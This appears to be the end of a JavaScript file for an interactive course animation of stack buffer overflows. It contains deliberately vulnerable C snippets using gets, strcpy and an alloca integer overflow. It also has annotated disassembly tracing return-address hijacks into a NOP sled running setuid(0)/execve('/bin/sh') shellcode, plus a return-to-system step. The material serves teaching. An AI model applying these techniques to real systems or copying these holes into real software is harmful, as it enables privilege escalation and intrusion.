          values: { eip: "0xfff6b7c8", ebp: "0xfff6b978", pad: "padding", buf: "900 NOPs + shellcode at 900", gap: "stack space" },
          highlight: ["eip"]
        },
        {
          title: "Landing in the NOP sled",
          desc: "ret pops 0xfff6b7c8 and ESP becomes 0xfff6b960. For this run, the landing offset is 0xfff6b7c8 - 0xfff6b550 = 0x278 = 632 bytes, inside the 0-899 sled.",
          code: "ret -> 0xfff6b7c8",
          asm: "0xfff6b7c8: nop",
          regs: { eip: "0xfff6b7c8", esp: "0xfff6b960", ebp: "0xfff6b958" },
          values: { eip: "0xfff6b7c8", ebp: "0xfff6b978", pad: "padding", buf: "executing NOP sled at offset 632", gap: "stack space" },
          highlight: ["buf", "eip"]
        },
        {
          title: "Slide into shellcode",
          desc: "The CPU executes NOPs until offset 900, then runs shellcode.py: setuid(0), then execve(\"/bin/sh\").",
          code: "shellcode at offset 900",
          asm: "setuid(0) -> execve(\"/bin/sh\")",
          regs: { eip: "0xfff6b7c8", esp: "0xfff6b960", ebp: "0xfff6b958" },
          values: { eip: "0xfff6b7c8", ebp: "0xfff6b978", pad: "padding", buf: "NOPs sliding to shellcode", gap: "stack space" }
        }
      ]
    }
  };

const META = {
  t0: {
    source: [
      "int _main(int argc, char *argv[])",
      "{",
      "    char grade[5];",
      "    char name[10];",
      "",
      "    strcpy(grade, \"nil\");",
      "    gets(name);",
      "    printf(\"Hi %s! Your grade is %s.\\n\", name, grade);",
      "    exit(0);",
      "}"
    ],
    lines: [6, 7, 7, 7, 8],
    disasm: [
      { addr: "0x0804a0a7", sym: "<_main+18>", text: "lea eax,[ebp-0xd]", note: "EAX = address of grade" },
      { addr: "0x0804a0aa", sym: "<_main+21>", text: "mov DWORD PTR [eax],0x6c696e", note: "write \"nil\" into grade" },
      { addr: "0x0804a0b3", sym: "<_main+30>", text: "lea eax,[ebp-0x17]", note: "EAX = address of name" },
      { addr: "0x0804a0b7", sym: "<_main+34>", text: "call 0x8057ee0 <_IO_gets>", note: "unbounded read into name" },
      { addr: "0x0804a0bc", sym: "<_main+39>", text: "add esp,0x10", note: "discard gets arguments" },
      { addr: "0x0804a0c2", sym: "<_main+45>", text: "lea eax,[ebp-0xd]", note: "prepare grade for printf" },
      { addr: "0x0804a0c6", sym: "<_main+49>", text: "lea eax,[ebp-0x17]", note: "prepare name for printf" },
      { addr: "0x0804a0d1", sym: "<_main+60>", text: "call 0x8051220 <_IO_printf>", note: "print name and grade" },
      { addr: "0x0804a0de", sym: "<_main+73>", text: "call 0x80506f0 <exit>", note: "exit(0)" }
    ],
    pcs: [3, 3, 3, 4, 7],
    hijack: []
  },

  t1: {
    source: [
      "void vulnerable()",
      "{",
      "    char input[4];",
      "    gets(input);",
      "}",
      "",
      "int _main()",
      "{",
      "    vulnerable();",
      "    print_bad_grade();",
      "    return 0;",
      "}"
    ],
    lines: [4, 4, 4, 4, 5, 5],
    disasm: [
      { addr: "0x0804a151", sym: "<vulnerable+0>", text: "push ebp", note: "save caller EBP" },
      { addr: "0x0804a152", sym: "<vulnerable+1>", text: "mov ebp,esp", note: "new frame base" },
      { addr: "0x0804a155", sym: "<vulnerable+4>", text: "sub esp,0x14", note: "reserve local space" },
      { addr: "0x0804a165", sym: "<vulnerable+20>", text: "lea edx,[ebp-0xc]", note: "EDX = address of input" },
      { addr: "0x0804a16b", sym: "<vulnerable+26>", text: "call 0x8057f60 <_IO_gets>", note: "unbounded read; overflows" },
      { addr: "0x0804a170", sym: "<vulnerable+31>", text: "add esp,0x10", note: "discard gets arguments" },
      { addr: "0x0804a177", sym: "<vulnerable+38>", text: "leave", note: "ESP=EBP; pop saved EBP" },
      { addr: "0x0804a178", sym: "<vulnerable+39>", text: "ret", note: "pop saved EIP into EIP" },
      { addr: "0x0804a123", sym: "<print_good_grade+0>", text: "push ebp", note: "hijack target" },
      { addr: "0x0804a18e", sym: "<_main+21>", text: "call 0x804a0f5 <print_bad_grade>", note: "normal path, bypassed" }
    ],
    pcs: [3, 4, 4, 5, 7, 8],
    hijack: [5]
  },

  t2: {
    source: [
      "void vulnerable(char *arg)",
      "{",
      "    char buf[100];",
      "    strcpy(buf, arg);",
      "}",
      "",
      "int _main(int argc, char **argv)",
      "{",
      "    vulnerable(argv[1]);",
      "    return 0;",
      "}"
    ],
    lines: [4, 4, 4, 4, 5, 5],
    disasm: [
      { addr: "0x0804a035", sym: "<vulnerable+0>", text: "push ebp", note: "save caller EBP" },
      { addr: "0x0804a036", sym: "<vulnerable+1>", text: "mov ebp,esp", note: "new frame base" },
      { addr: "0x0804a039", sym: "<vulnerable+4>", text: "sub esp,0x74", note: "reserve local space" },
      { addr: "0x0804a04c", sym: "<vulnerable+23>", text: "lea edx,[ebp-0x6c]", note: "EDX = address of buf" },
      { addr: "0x0804a052", sym: "<vulnerable+29>", text: "call strcpy", note: "unbounded copy; overflows buf" },
      { addr: "0x0804a057", sym: "<vulnerable+34>", text: "add esp,0x10", note: "discard strcpy arguments" },
      { addr: "0x0804a05e", sym: "<vulnerable+41>", text: "leave", note: "ESP=EBP; pop saved EBP" },
      { addr: "0x0804a05f", sym: "<vulnerable+42>", text: "ret", note: "pop saved EIP into EIP" },
      { addr: "0xfff6b9dc", sym: "<buf>", text: "xor ebx,ebx", note: "shellcode starts: setuid(0)" }
    ],
    pcs: [3, 4, 4, 5, 6, 7],
    hijack: [5]
  },

  t3: {
    source: [
      "void vulnerable(char *arg)",
      "{",
      "    int *p;",
      "    int a;",
      "    char buf[2048];",
      "",
      "    strncpy(buf, arg, sizeof(buf) + 8);",
      "",
      "    *p = a;",
      "}"
    ],
    lines: [7, 7, 7, 7, 9, 9, 10, 10],
    disasm: [
      { addr: "0x0804a035", sym: "<vulnerable+0>", text: "push ebp", note: "save caller EBP" },
      { addr: "0x0804a036", sym: "<vulnerable+1>", text: "mov ebp,esp", note: "new frame base" },
      { addr: "0x0804a039", sym: "<vulnerable+4>", text: "sub esp,0x814", note: "reserve 2048-byte buffer" },
      { addr: "0x0804a04c", sym: "<vulnerable+23>", text: "push 0x808", note: "copy size = 2056" },
      { addr: "0x0804a054", sym: "<vulnerable+31>", text: "lea edx,[ebp-0x810]", note: "EDX = address of buf" },
      { addr: "0x0804a05d", sym: "<vulnerable+41>", text: "call strncpy", note: "overflow a and p" },
      { addr: "0x0804a062", sym: "<vulnerable+46>", text: "add esp,0x10", note: "discard strncpy arguments" },
      { addr: "0x0804a065", sym: "<vulnerable+49>", text: "mov eax,[ebp-0xc]", note: "EAX = p (destination pointer)" },
      { addr: "0x0804a068", sym: "<vulnerable+52>", text: "mov edx,[ebp-0x10]", note: "EDX = a (value to write)" },
      { addr: "0x0804a06b", sym: "<vulnerable+55>", text: "mov [eax],edx", note: "*p = a; hijacks saved EIP" },
      { addr: "0x0804a071", sym: "<vulnerable+61>", text: "leave", note: "ESP=EBP; pop saved EBP" },
      { addr: "0x0804a072", sym: "<vulnerable+62>", text: "ret", note: "pop saved EIP into EIP" },
      { addr: "0xfff6b238", sym: "<buf>", text: "xor ebx,ebx", note: "shellcode starts: setuid(0)" }
    ],
    pcs: [4, 5, 5, 6, 7, 9, 11, 12],
    hijack: [6]
  },

  t4: {
    source: [
      "void read_file(char *name)",
      "{",
      "    FILE *f = fopen(name, \"rb\");",
      "    unsigned int count;",
      "    fread(&count, 4, 1, f);",
      "",
      "    unsigned int *buf = alloca(count * sizeof(unsigned int));",
      "",
      "    read_elements(f, buf, count);",
      "}",
      "",
      "void read_elements(FILE *f, int *buf, unsigned int count)",
      "{",
      "    for (unsigned int i = 0; i < count; i++)",
      "        fread(&buf[i], 4, 1, f);",
      "}"
    ],
    lines: [4, 5, 7, 9, 14, 14, 9, 10],
    disasm: [
      { addr: "0x0804a149", sym: "<read_file+97>", text: "mov eax,[ebp-0x14]", note: "EAX = count" },
      { addr: "0x0804a14c", sym: "<read_file+100>", text: "shl eax,2", note: "count * 4; 0x40000000 wraps to 0" },
      { addr: "0x0804a16b", sym: "<read_file+131>", text: "sub esp,eax", note: "alloca(size); size is zero" },
      { addr: "0x0804a16d", sym: "<read_file+133>", text: "mov eax,esp", note: "buf = current ESP" },
      { addr: "0x0804a181", sym: "<read_file+153>", text: "push count", note: "pass huge count to reader" },
      { addr: "0x0804a18e", sym: "<read_file+166>", text: "call read_elements", note: "read words into zero-size buffer" },
      { addr: "0x0804a0b0", sym: "<read_elements+27>", text: "mov eax,[ebp-0xc]", note: "EAX = loop index i" },
      { addr: "0x0804a0b3", sym: "<read_elements+30>", text: "lea edx,[eax*4+0]", note: "EDX = i * 4" },
      { addr: "0x0804a0c7", sym: "<read_elements+50>", text: "call fread", note: "write one word at buf+i" },
      { addr: "0x0804a0d3", sym: "<read_elements+62>", text: "add DWORD PTR [ebp-0xc],1", note: "i++" },
      { addr: "0x0804a193", sym: "<read_file+171>", text: "add esp,0x10", note: "cleanup after read_elements" },
      { addr: "0x0804a19d", sym: "<read_file+181>", text: "ret", note: "pop overwritten saved EIP" },
      { addr: "0xfff6bb5c", sym: "<NOP sled>", text: "nop", note: "control lands in the sled" }
    ],
    pcs: [4, 0, 2, 8, 8, 8, 10, 11],
    hijack: [7]
  },

  t5: {
    source: [
      "void vulnerable(char *arg)",
      "{",
      "    char buf[10];",
      "    strcpy(buf, arg);",
      "}",
      "",
      "void greetings(void)",
      "{",
      "    system(\"echo Hello World\");",
      "}"
    ],
    lines: [4, 4, 4, 4, 5, 9, 9],
    disasm: [
      { addr: "0x0804a060", sym: "<vulnerable+0>", text: "push ebp", note: "save caller EBP" },
      { addr: "0x0804a061", sym: "<vulnerable+1>", text: "mov ebp,esp", note: "new frame base" },
      { addr: "0x0804a064", sym: "<vulnerable+4>", text: "sub esp,0x14", note: "reserve local space" },
      { addr: "0x0804a077", sym: "<vulnerable+23>", text: "lea edx,[ebp-0x12]", note: "EDX = address of buf" },
      { addr: "0x0804a07d", sym: "<vulnerable+29>", text: "call strcpy", note: "unbounded copy; overflows" },
      { addr: "0x0804a082", sym: "<vulnerable+34>", text: "add esp,0x10", note: "discard strcpy arguments" },
      { addr: "0x0804a089", sym: "<vulnerable+41>", text: "leave", note: "ESP=EBP; pop saved EBP" },
      { addr: "0x0804a08a", sym: "<vulnerable+42>", text: "ret", note: "pop saved EIP into EIP" },
      { addr: "0x08051520", sym: "<system>", text: "push ebx", note: "system reads [esp] fake return, [esp+4] /bin/sh" }
    ],
    pcs: [3, 4, 4, 5, 7, 8, 8],
    hijack: [4, 5]
  },

  t6: {
    source: [
      "void vulnerable(char *arg)",
      "{",
      "    char buf[1024];",
      "    strcpy(buf, arg);",
      "}",
      "",
      "// helper.c MINIASLR:",
      "// stack_goal -= r & 0xFF;"
    ],
    lines: [4, 4, 4, 4, 5, 5, 5],
    disasm: [
      { addr: "0x0804a051", sym: "<vulnerable+0>", text: "push ebp", note: "save caller EBP" },
      { addr: "0x0804a052", sym: "<vulnerable+1>", text: "mov ebp,esp", note: "new frame base" },
      { addr: "0x0804a055", sym: "<vulnerable+4>", text: "sub esp,0x404", note: "reserve 1024-byte buffer" },
      { addr: "0x0804a06b", sym: "<vulnerable+26>", text: "lea edx,[ebp-0x408]", note: "EDX = address of buf" },
      { addr: "0x0804a074", sym: "<vulnerable+35>", text: "call strcpy", note: "unbounded copy; overflows" },
      { addr: "0x0804a079", sym: "<vulnerable+40>", text: "add esp,0x10", note: "discard strcpy arguments" },
      { addr: "0x0804a080", sym: "<vulnerable+47>", text: "leave", note: "ESP=EBP; pop saved EBP" },
      { addr: "0x0804a081", sym: "<vulnerable+48>", text: "ret", note: "pop saved EIP into EIP" },
      { addr: "0xfff6b7c8", sym: "<NOP sled>", text: "nop", note: "control lands in the sled" }
    ],
    pcs: [3, 4, 4, 5, 7, 8, 8],
    hijack: [5]
  }
};

const HEX = (n) => "0x" + (n >>> 0).toString(16).padStart(8, "0");

function esc(s) {
  return String(s).replace(/[&<>"']/g, c => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
  }[c]));
}

function initAnimation(root) {
  const key = root.dataset.target;
  const model = DATA[key];
  const meta = META[key];
  if (!model || !meta) return;

  const rows = model.rows.slice().sort((a, b) => (b.addr + b.size) - (a.addr + a.size));
  const lines = meta.lines || [];
  const pcs = meta.pcs || [];
  const hijackSteps = new Set(meta.hijack || []);
  let index = 0;
  let timer = null;
  let previousValues = {};

  root.innerHTML = `
    <div class="sa-head">
      <div>
        <div class="sa-kicker">Watch the stack grow downward</div>
        <h3>${esc(model.title)}</h3>
        <p class="sa-sub">${esc(model.subtitle)}</p>
      </div>
      <div class="sa-hijack-badge">Control flow hijacked</div>
    </div>
    <div class="sa-body">
      <div class="sa-layout">
        <div class="sa-left">
          <div class="sa-panel">
            <div class="sa-panel-title"><span>Register group: general</span><span class="dim">current GDB values</span></div>
            <div class="sa-regs"></div>
          </div>
          <div class="sa-panel">
            <div class="sa-panel-title"><span>source.c</span><span class="dim">current line highlighted</span></div>
            <div class="sa-source"></div>
          </div>
          <div class="sa-panel">
            <div class="sa-panel-title"><span>Disassembly (layout asm)</span><span class="dim">each line quoted</span></div>
            <div class="sa-disasm"></div>
          </div>
        </div>
        <div class="sa-panel sa-stack-panel">
          <div class="sa-panel-title"><span>Stack: x/wx $esp, drawn high -&gt; low</span><span class="dim">higher addresses first</span></div>
          <div class="sa-stack-legend">
            <span style="--sw:#2e9e5b">return address</span>
            <span style="--sw:#3d8bd6">frame / EBP</span>
            <span style="--sw:#b4761a">buffer / data</span>
            <span style="--sw:#8b5cf6">temporary call frame</span>
          </div>
          <div class="sa-axis">higher memory addresses</div>
          <div class="sa-stack"></div>
          <div class="sa-axis low">lower memory addresses - the stack grows downward when values are pushed</div>
        </div>
      </div>
      <div class="sa-status"><span class="flag">HIJACKED</span><strong></strong><span class="sa-desc"></span></div>
      <div class="sa-controls">
        <button type="button" class="sa-prev">Back</button>
        <button type="button" class="sa-next primary">stepi</button>
        <button type="button" class="sa-play">Auto-play</button>
        <button type="button" class="sa-reset">Reset</button>
        <div class="sa-progress"><span></span></div>
        <div class="sa-count"></div>
      </div>
    </div>`;

  const regsEl = root.querySelector(".sa-regs");
  const sourceEl = root.querySelector(".sa-source");
  const disasmEl = root.querySelector(".sa-disasm");
  const stackEl = root.querySelector(".sa-stack");
  const statusEl = root.querySelector(".sa-status");
  const statusStrong = statusEl.querySelector("strong");
  const statusDesc = statusEl.querySelector(".sa-desc");
  const progress = root.querySelector(".sa-progress > span");
  const countEl = root.querySelector(".sa-count");
  const prevBtn = root.querySelector(".sa-prev");
  const nextBtn = root.querySelector(".sa-next");
  const resetBtn = root.querySelector(".sa-reset");
  const playBtn = root.querySelector(".sa-play");

  sourceEl.innerHTML = meta.source.map((line, i) =>
    `<div class="sa-src-line" data-line="${i + 1}"><span class="ln">${i + 1}</span><span>${esc(line) || " "}</span></div>`
  ).join("");

  disasmEl.innerHTML = meta.disasm.map((line, i) =>
    `<div class="sa-dis-line" data-pc="${i}">
      <span class="arrow"></span>
      <span class="addr">${esc(line.addr)}</span>
      <span class="sym">${esc(line.sym)}</span>
      <span class="instr">${esc(line.text)} <span class="note">; ${esc(line.note)}</span></span>
    </div>`
  ).join("");

  stackEl.innerHTML = rows.map(row => {
    const end = row.addr + row.size - 1;
    const rangeLabel = row.size === 4 ? HEX(row.addr) : `${HEX(row.addr)}..${HEX(end)}`;
    const addrLabel = HEX(row.addr);
    return `<div class="sa-row hidden kind-${esc(row.kind || "pad")}" data-id="${esc(row.id)}">
      <span class="sa-tags"></span>
      <span class="sa-addr" title="${esc(rangeLabel)}">${esc(addrLabel)}</span>
      <span class="sa-val"></span>
      <span class="sa-mean">${esc(row.label)} <span style="color:#647b91">(${row.size} B)</span></span>
    </div>`;
  }).join("");

  function stopPlay() {
    if (timer) {
      clearInterval(timer);
      timer = null;
      playBtn.textContent = "Auto-play";
    }
  }

  function render() {
    const step = model.steps[index];
    const regs = step.regs || {};
    const isHijack = hijackSteps.has(index);

    root.classList.toggle("hijack", isHijack);
    statusStrong.textContent = step.title + " ";
    statusDesc.textContent = step.desc;

    regsEl.innerHTML = [
      regCard("eax", regs.eax, "eax"),
      regCard("edx", regs.edx, "edx"),
      regCard("ebp", regs.ebp, "ebp"),
      regCard("esp", regs.esp, "esp"),
      regCard("eip", regs.eip, "eip" + (isHijack ? " hijack" : ""))
    ].join("");

    const activeLine = lines[index] || -1;
    sourceEl.querySelectorAll(".sa-src-line").forEach(el => {
      el.classList.toggle("active", Number(el.dataset.line) === activeLine);
    });
    const activePc = pcs[index] === undefined ? -1 : pcs[index];
    disasmEl.querySelectorAll(".sa-dis-line").forEach(el => {
      const on = Number(el.dataset.pc) === activePc;
      el.classList.toggle("active", on);
      el.classList.toggle("hijack-line", on && isHijack && /ret|mov \[eax\],edx|system/.test(meta.disasm[Number(el.dataset.pc)].text));
    });

    const values = step.values || {};
    const highlight = new Set(step.highlight || []);
    const esp = regs.esp ? parseInt(regs.esp, 16) : null;
    const ebp = regs.ebp ? parseInt(regs.ebp, 16) : null;

    rows.forEach(row => {
      const el = stackEl.querySelector(`[data-id="${row.id}"]`);
      const active = Object.prototype.hasOwnProperty.call(values, row.id);
      const value = active ? values[row.id] : "";
      const changed = active && previousValues[row.id] !== value;
      const inEsp = esp !== null && esp >= row.addr && esp < row.addr + row.size;
      const inEbp = ebp !== null && ebp >= row.addr && ebp < row.addr + row.size;
      const isReturn = row.kind === "return";

      el.classList.toggle("hidden", !active);
      el.querySelector(".sa-val").textContent = value;
      el.classList.toggle("changed", changed || highlight.has(row.id));
      el.classList.toggle("is-esp", inEsp);
      el.classList.toggle("is-ebp", inEbp);
      el.classList.toggle("hijack-row", isHijack && isReturn);

      const tags = [];
      if (inEsp) tags.push('<span class="tag esp">ESP</span>');
      if (inEbp) tags.push('<span class="tag ebp">EBP</span>');
      if (isReturn) tags.push('<span class="tag eip">ret</span>');
      el.querySelector(".sa-tags").innerHTML = tags.join("");
    });

    previousValues = Object.assign({}, values);
    progress.style.width = ((index + 1) / model.steps.length * 100).toFixed(2) + "%";
    countEl.textContent = `step ${index + 1} / ${model.steps.length}`;
    prevBtn.disabled = index === 0;
    nextBtn.disabled = index === model.steps.length - 1;
  }

  function regCard(name, value, cls) {
    return `<div class="sa-reg ${cls}"><span class="k">${name}</span><span class="v">${esc(value || "--")}</span></div>`;
  }

  function go(delta) {
    stopPlay();
    index = Math.max(0, Math.min(model.steps.length - 1, index + delta));
    render();
  }

  prevBtn.addEventListener("click", () => go(-1));
  nextBtn.addEventListener("click", () => go(1));
  resetBtn.addEventListener("click", () => { stopPlay(); index = 0; previousValues = {}; render(); });
  playBtn.addEventListener("click", () => {
    if (timer) { stopPlay(); return; }
    if (index === model.steps.length - 1) {
      index = 0;
      previousValues = {};
      render();
    }
    playBtn.textContent = "Pause";
    timer = setInterval(() => {
      if (index >= model.steps.length - 1) { stopPlay(); return; }
      index += 1;
      render();
    }, 1600);
  });

  render();
}

function initAll() {
  document.querySelectorAll(".stack-anim[data-target]").forEach(initAnimation);
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initAll);
} else {
  initAll();
}
})();
